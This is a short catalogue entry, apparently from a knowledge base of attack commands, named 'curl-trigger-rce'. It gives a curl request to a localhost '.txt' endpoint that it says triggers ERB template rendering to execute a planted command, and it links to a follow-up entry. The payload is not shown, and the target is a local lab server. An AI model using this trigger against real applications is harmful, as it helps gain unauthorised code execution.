---
data: 'curl "http://localhost:3000/books/1.txt"'
tags:
  - rce
  - execution
type: command
output: Text response executing touch me
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.349Z'
id: 8477fc27-711f-4927-a696-7c761d9e565d
verified: false
validated: true
submitted: true
---
# curl-trigger-rce

## Command

```bash
curl "http://localhost:3000/books/1.txt"
```

## Description

Triggers ERB rendering in text format to execute command.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| .txt URL | Text format endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost:3000/books/1.txt"
```

## Expected Output

Command executed.

## Related

- [[commands/ls-after-rce]]
